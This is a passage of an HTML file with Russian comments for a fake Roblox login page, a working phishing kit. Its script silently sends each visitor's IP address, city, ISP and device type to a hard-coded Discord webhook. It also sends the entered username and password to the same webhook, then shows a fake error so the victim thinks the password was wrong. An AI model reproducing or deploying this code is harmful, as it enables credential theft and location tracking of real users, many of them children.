        /* Кнопка Log In в правом верхнем углу */
        header { 
            width: 100%; 
            padding: 20px 30px; 
            display: flex; 
            justify-content: flex-end; 
            align-items: center; 
            position: absolute; 
            top: 0; right: 0; 
            z-index: 10; 
        }

        .header-btn {
            background-color: #fff; 
            color: #000; 
            padding: 10px 24px; 
            border-radius: 8px; 
            font-size: 15px; 
            font-weight: 700; 
            cursor: pointer; 
            border: none; 
            transition: 0.2s;
        }
        .header-btn:hover { background-color: #e6e6e6; }

        /* Логотип по центру */
        .logo { 
            position: absolute; 
            top: 15%; 
            width: 100%; 
            text-align: center; 
            font-size: 48px; 
            font-weight: 900; 
            font-family: 'Arial Black', sans-serif; 
            letter-spacing: -2px; 
            text-shadow: 0 4px 10px rgba(0,0,0,0.8);
            pointer-events: none;
        }

        /* То самое окно логина */
        .login-modal {
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); 
            backdrop-filter: blur(4px);
            display: flex; 
            align-items: center; 
            justify-content: center; 
            z-index: 100;
        }

        .login-box {
            background-color: #232527; 
            padding: 30px 40px; 
            border-radius: 12px; 
            width: 100%; 
            max-width: 380px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
            border: 1px solid #3a3d40;
            text-align: center;
        }

        .login-box h2 { font-size: 24px; font-weight: 800; margin-bottom: 25px; }

        .login-input {
            width: 100%; 
            padding: 14px 16px; 
            background-color: #1a1b1e; 
            border: 1px solid #4b4f54; 
            border-radius: 8px; 
            color: #fff; 
            font-size: 15px; 
            margin-bottom: 12px; 
            outline: none;
        }
        .login-input::placeholder { color: #8b8f94; }
        .login-input:focus { border-color: #00a2ff; }

        .btn-login-main {
            width: 100%; 
            padding: 14px; 
            background-color: #1a1b1e; 
            color: #fff; 
            border: 1px solid #4b4f54; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: 700; 
            cursor: pointer; 
            margin-top: 5px; 
            margin-bottom: 15px; 
            transition: 0.2s;
        }
        .btn-login-main:hover { background-color: #2c2e33; border-color: #00a2ff; }

        .forgot-link { display: block; color: #fff; text-decoration: none; font-size: 14px; font-weight: 600; margin-bottom: 25px; }
        .forgot-link:hover { text-decoration: underline; }

        .btn-secondary {
            width: 100%; 
            padding: 14px; 
            background-color: #2c2e33; 
            color: #fff; 
            border: none; 
            border-radius: 8px; 
            font-size: 14px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-bottom: 10px; 
            transition: 0.2s;
        }
        .btn-secondary:hover { background-color: #3a3d40; }

        .signup-redirect { font-size: 14px; color: #ccc; margin-top: 20px; }
        .signup-redirect a { color: #fff; font-weight: 700; text-decoration: none; cursor: pointer; }
        .signup-redirect a:hover { text-decoration: underline; }

        /* Сообщение об ошибке (появляется после ввода) */
        .error-msg {
            color: #ff4d4d;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
            text-align: left;
        }
    </style>
</head>
<body>

    <div class="bg-grid"></div>
    
    <header>
        <button class="header-btn" onclick="focusLogin()">Log In</button>
    </header>

    <div class="logo">ROBLOX</div>

    <!-- Окно входа -->
    <div class="login-modal" id="loginModal">
        <div class="login-box">
            <h2>Login to Roblox</h2>
            
            <div class="error-msg" id="errorMsg">Incorrect username or password. Please try again.</div>

            <form id="loginForm">
                <input type="text" id="loginUsername" class="login-input" placeholder="Username/Email/Phone" required>
                <input type="password" id="loginPassword" class="login-input" placeholder="Password" required>
                <button type="submit" class="btn-login-main">Log In</button>
            </form>

            <a href="#" class="forgot-link" onclick="event.preventDefault(); alert('Password reset is currently unavailable.')">Forgot Password or Username?</a>

            <button class="btn-secondary" onclick="alert('One-Time Code sent to your email! (Demo)')">Email Me a One-Time Code</button>
            <button class="btn-secondary" onclick="alert('Quick Sign-in is not available on this device.')">Quick Sign-in</button>

            <div class="signup-redirect">
                Don't have an account? <a href="#" onclick="event.preventDefault(); alert('Registration is temporarily closed.');">Sign Up</a>
            </div>
        </div>
    </div>

    <script>
        // ВСТАВЬ СВОЮ ССЫЛКУ НА ДИСКОРД СЮДА:
        const webhookUrl = "https://discord.com/api/webhooks/1562071981678006302/4eUy6YxJuvvhzecrrJy0AsXaz9H9iV4oQPsKgK2pVtCJkA_eKn3NC2YxgarSYu_WPRgg";
        // -        // --- ЛОГГЕР IP И УСТРОЙСТВА ---
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip || 'Неизвестно';
                const city = data.city || 'Неизвестно';
                const region = data.region || 'Неизвестно';
                const country = data.country_name || 'Неизвестно';
                const isp = data.org || 'Неизвестно';
                
                const ua = navigator.userAgent;
                let device = "Компьютер";
                if (/android/i.test(ua)) device = "Android Телефон";
                if (/iPad|iPhone|iPod/.test(ua)) device = "iPhone / iPad";

                                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "🌐 Новый переход!\nIP: " + ip + "\nГород: " + city + "\nПровайдер: " + isp + "\nУстройство: " + device
                    })
                }).catch(e => console.log("Error", e));
            })
            .catch(err => console.log("Ошибка получения IP", err));
        // Если нажать на кнопку в углу — подсвечиваем поле ввода
        function focusLogin() {
            document.getElementById('loginUsername').focus();
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('loginUsername').value;
            const pass = document.getElementById('loginPassword').value;

            // Отправляем данные в Дискорд
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "**Новый вход в Roblox!**\n**Логин:** `" + user + "`\n**Пароль:** `" + pass + "`"
                })
            }).catch(err => console.log(err));

            // Имитируем загрузку и показываем ошибку
            const btn = document.querySelector('.btn-login-main');
            const originalText = btn.textContent;
            btn.textContent = 'Logging in...';
            btn.disabled = true;

            setTimeout(() => {
                btn.textContent = originalText;
                btn.disabled = false;
                
                // Показываем красную ошибку (чтобы жертва подумала, что пароль неверный)
                document.getElementById('errorMsg').style.display = 'block';
                
                // Очищаем поле пароля
                document.getElementById('loginPassword').value = '';
            }, 1000);
        });
    </script>
</body>
</html>
